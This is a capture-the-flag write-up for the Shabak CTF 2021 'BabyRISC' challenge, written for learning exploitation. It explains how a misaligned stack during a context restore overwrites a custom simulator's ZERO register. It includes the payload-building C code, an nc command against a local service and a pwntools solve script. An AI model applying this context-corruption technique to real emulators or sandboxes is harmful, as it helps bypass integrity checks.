# Shabak CTF 2021 - BabyRISC

**Category**: Pwn

**The task**:

> Following ARM’s success, I went ahead and designed my own RISC assembly language.
> I wrote a simulator, so you’ll be able to run your own programs and enjoy the (very) reduced instruction set!
> Of course, with such minimal implementation, reading the flag is impossible.

In this challenge, we were given a simulator with a reduced instruction set & 32bit processor. The source code of the simulator was also provided. 

There is a 'stub'(aka the _admin code_) which is always executed at the end. It prints the flag only if a certain condition is satisfied. The condition is quite trickey, and requires us to break some of the processor's implementation rules if we want to read the flag. 

# Analysis

## Available registers

Looking at [./inc/asm_processor_state.h](./task-files/inc/asm_processor_state.h#L9-L27), we can see a list of available "ARM-like" registers, stored in the ``.bss`` segment:

```c
// Registers indices
typedef enum asm_register_e
{
    ASM_REGISTER_START,
    ASM_REGISTER_ZERO = ASM_REGISTER_START,
    ASM_REGISTER_R0,
    ASM_REGISTER_R1,
    ASM_REGISTER_R2,
    ASM_REGISTER_R3,
    ASM_REGISTER_R4,
    ASM_REGISTER_R5,
    ASM_REGISTER_R6,
    ASM_REGISTER_SP,
    ASM_REGISTER_END
} asm_register_t;

#define ASM_STACK_SIZE (4096)
extern uint8_t asm_stack[ASM_STACK_SIZE];
extern reg_value_t registers[ASM_REGISTER_END - ASM_REGISTER_START];
```

The simulator contains the following registers:

* ``ZERO`` register: Always contains zero, this is used for calculation purposes when the number zero is needed.
* ``R0`` ... ``R6`` registers: Common ARM registers. In this simulator, they are general purpose.
* ``SP`` register: used as a stack pointer. Changes whenever we're PUSHing and POPing from the stack.


## The Instructions set

The opcodes for the instruction set are found at [./inc/asm_instructions.h](./task-files/inc/asm_instructions.h#L9-L41)

```c
typedef enum asm_opcode_e
{
    ADD,
    ADDI,
    AND,
    ANDI,
    DIV,
    DIVI,
    MUL,
    MULI,
    OR,
    ORI,
    PRINTC,
    PRINTDD,
    PRINTDX,
    PRINTNL,
    RET,
    RETNZ,
    RETZ,
    ROL,
    ROR,
    SHL,
    SHR,
    SUB,
    SUBI,
    XOR,
    XORI,
    PUSH,
    POP,
    PUSHCTX,
    POPCTX,

    MAX_ASM_OPCODE_VAL
} asm_opcode_t;
```

There are common instructions, such as ``ADD``, ``MUL``, ``SUB``, etc.

Every arithmetic operation has a corresponding [immediate](https://www.sciencedirect.com/topics/computer-science/immediate-operand) "version", such as: ``ADDI``, ``MULI``, ``SUBI``, etc.
>**Immediate Operands**: In addition to register operations, ARM instructions can use constant or immediate operands. These constants are called immediates, because their values are immediately available from the instruction and do not require a register or memory access.

Besides that, there are also custom instructions implemented, such as:

* ``PRINTNL`` ([snippet](./task-files/src/asm_instructions.c#L206-L210)) - printing a newline
* ``PUSHCTX`` ([snippet](./task-files/src/asm_instructions.c#L365-L386))  - push a "state snapshot"(==context) of the registers into the stack
* ``POPCTX`` ([snippet](./task-files/src/asm_instructions.c#L388-L410)) - pop a context from the stack onto the registers
* More printing instructions such as ``PRINTDD``(print decimal), ``PRINTC``(print a character) and ``PRINTDX``(print hex) are also available.


## Validations / checks

To define the opcodes, the program implements a series of [nasty, C, multi-line macros](./task-files/src/asm_instructions.c#L14-L202). 

During execution, those macros are triggering validations, such as:

* The program validates that we cannot exceed that stack limit ([snippet](./task-files/src/asm_instructions.c#L320-L324))
* During a write operation, it also validates that we cannot write to the ``ZERO`` register ([snippet](./task-files/src/asm_processor_state.c#L31-L34))
* The program also has handlers for division by zero / weird edge cases. But this is less relevant for this writeup.

# Time to pwn

After we covered the basics of the simulator, it's time to dig into ``main()``.

During startup, the program:
* Generates an _'admin shellcode'_ that prints the flag(we will look at it soon) - [snippet](./task-files/src/main.c#L189-L194)
* Gets a shellcode input from the user - [snippet](./task-files/src/main.c#L196-L201)
* Appending the admin shellcode to the end of the user's shellcode - [snippet](./task-files/src/main.c#L205-L213)
* Parse the final shellcode(user code, followed by admin code) and start execution - [snippet](./task-files/src/main.c#L217)

## The admin code

The admin code is generating a bytecode that perform the following check([snippet](./task-files/src/main.c#L94-L98)):
```c
    // If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, 42);
    ret |= file_write_opcode3(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1);
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, 1);
    ret |= file_write_opcode1(payload_fp, RETNZ, ASM_REGISTER_R2);
```

Which basically means:
```
// If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag
ADDI R1, ZERO, 42
MUL R2, R0, R1
SUBI R2, R2, 1
RETNZ R2 // if R2 is not zero, return and don't print the flag
```

After taking a closer look at it, this is not ``(R0 * 42) == 1``, but rather ``(R0 * (42+ZERO)) == 1``.

Those instructions are executed after the user's bytecode is executed. Meaning that our "entry point" here will be using the ``R0`` register. If we can make ``(R0 * (42+ZERO)) == 1`` to be true: the admin shellcode will print out the flag, 4 bytes at a time(since this is a 32bit processor).

The following snippet shows how the admin code prints the flag:
```c
    // Print each 4-bytes of the flag as 4-characters
    // (We might print some trailing null-characters if the flag length is not divisible by 4)
    int32_t * flag_start = (int32_t *)flag_string;
    int32_t * flag_end = (int32_t *)((char *)flag_string + strlen(flag_string));
    for (int32_t * p = flag_start; p <= flag_end; ++p)
    {
        int32_t dword = *p;

        ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, dword);
        for (size_t j = 0; j < 4; j++)
        {
            ret |= file_write_opcode1(payload_fp, PRINTC, ASM_REGISTER_R1);
            ret |= file_write_opcode_imm32(payload_fp, ROR, ASM_REGISTER_R1, ASM_REGISTER_R1, 8);
        }
    }
```

**To solve this**, we will need to replace the ``ZERO`` register with the value ``-41`` and ``R0`` with the value ``1``(more about it is described in '_Solution_').

**The problem is**, as mentioned earlier, the simulator checks whenever we are trying to replace the contents of the ``ZERO`` register during write operation and throws a ``E_W2ZERO`` error code. We will have to overcome this obstacle.

# Solution

When saving and restoring the registers 'snapshot'/context(part of a ``POPCTX`` and ``PUSHCTX`` instruction), the simulator **also includes** the contents of the ``ZERO`` register as part of the context structure:

```c
sp_val -= sizeof(registers);
memcpy(registers, &asm_stack[sp_val], sizeof(registers));
```

This allows us to create a specially-crafted register context structure and overwrite the ``ZERO`` register value. To do this, we need to:
* Perform a ``SUBI R0, 41`` to set the ``R0`` register to ``-41``
* Perform a ``PUSHCTX`` to push the registers context
* Execute a ``PUSH 0`` instruction to corrupt the context structure alignment
* Perform a ``POPCTX``, which will overwrite the the ``ZERO`` register with ``-41`` (previously, this was the value of ``R0`` but the whole structure shifted by 4 bytes in memory once we did an extra ``PUSH`` in step 3)

The payload generation code for this is below([./solve-dir/build_pwn.c](./solve-dir/build_pwn.c)):

```c
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, (int32_t)41);  // REG_ZERO (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, (int32_t)0x1); // REG_R0   (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R2, ASM_REGISTER_ZERO, (int32_t)0x0); // REG_R1   (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R3, ASM_REGISTER_ZERO, (int32_t)0x0); // REG_R2   (after we POPCTX)
    ret |= file_write_opcode(payload_fp, PUSHCTX);                                                      // Pushing registers context
    ret |= file_write_opcode1(payload_fp, PUSH, (asm_register_t)ASM_REGISTER_R2);                       // Shifting the stack a little bit to make the POPCTX restore a 'malformed' structure of registers state 
    ret |= file_write_opcode(payload_fp,  (asm_opcode_t)POPCTX);                                        // Using POPCTX, Trigger the unsafe memcpy() and overwrite the ZERO_REG
    ret |= file_write_opcode3(payload_fp, XOR, ASM_REGISTER_R2, ASM_REGISTER_R2, ASM_REGISTER_R2);      // zero-ing out REG_R2 because the admin bytecode uses it after the user bytecode is executed

```

gdb output after this user payload was executed:
```
(gdb) p registers
$16 = {-41, 1, 0, 0, 0, 0, 0, 0, 0}
```

It worked! the ``ZERO`` register is ``-41``, and ``R0`` is 1.

Now, if we look at the admin code again:
```
ADDI R1, ZERO, 42
MUL R2, R0, R1
SUBI R2, R2, 1
RETNZ R2 // if R2 is not zero, return and don't print the flag
```

The result will be 0 and the program won't return too early (==our flag will be printed out). 

Let's try to launch the shellcode on the target host:

```sh
$ nc 127.0.0.1 9020 < ./solve-dir/pwn.bin 
User payload size: 36
>>> Executing code!








=lagRahh6got6it}����
>>> executed 0x43 instructions

```

The flag was printed! but it's a little bit, well, messy. 

This is happening because we corrupted the ``ZERO`` register with the value ``-41``. The admin code uses this register to print out the flag when iterating through the characters of the flag with the ``ROR`` instruction. 

To overcome this, I added a small python script that will add ``+41`` on every 32bit rotation.

The final exploit is below ([./solve.py](./solve.py)):
```py
from pwn import *


chall   = remote('127.0.0.1', 9020)
fh      = open('./solve-dir/pwn.bin', 'rb') # generated by ./solve-dir/build_pwn.c
payload = fh.read() 

chall.send(payload)
chall.recvuntil('Executing code!\n\x1b[0m')
chall.recv(4)
resp = chall.recv()

final        = ''
bits_counter = 0

for i in resp:
    final += chr(i+41) if bits_counter % 32 == 0 else chr(i)
    bits_counter += 8
    if final[-1:] == '}':
        break 
    
print(final)
```

output:

```
$ python3 solve.py 
[+] Opening connection to 127.0.0.1 on port 9020: Done
3


flag{ahh_got_it}
```

Thanks for the challenge :D